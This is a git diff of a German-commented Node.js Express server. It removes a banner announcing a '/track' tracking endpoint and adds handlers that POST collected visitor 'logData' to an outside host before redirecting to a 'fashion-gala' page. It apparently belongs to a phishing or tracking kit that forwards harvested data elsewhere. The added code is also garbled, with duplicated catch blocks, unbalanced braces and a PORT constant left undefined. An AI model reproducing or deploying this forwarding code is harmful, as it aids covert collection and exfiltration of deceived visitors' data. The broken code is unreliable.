@@ -115,19 +115,28 @@ process.on('unhandledRejection', (err) => {
   console.error('🔥 Unhandled Rejection:', err);
 });
 
-// 🚀 8. Serverstart
-const PORT = process.env.PORT || 10000;
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`
-  ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
-  ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
-  ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
-  ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
-  ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
-  ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
-  
-  🔥 Server gestartet auf Port: ${PORT}
-  🌐 Erlaubte Domains: ${allowedOrigins.join(', ')}
-  💀 Tracking aktiviert: /track
-  `);
+  res.redirect('/fashion-gala.html');
+
+  } catch (error) {
+    console.error("❌ Fehler:", error);
+    res.status(500).send("Serverfehler");
+  }
+});
+
+    await fetch('https://loropiana1.onrender.com/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(logData)
+    });
+
+    res.redirect('/fashion-gala.html');
+
+  } catch (error) {
+    console.error("❌ Fehler:", error);
+    res.status(500).send("Serverfehler");
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
 });
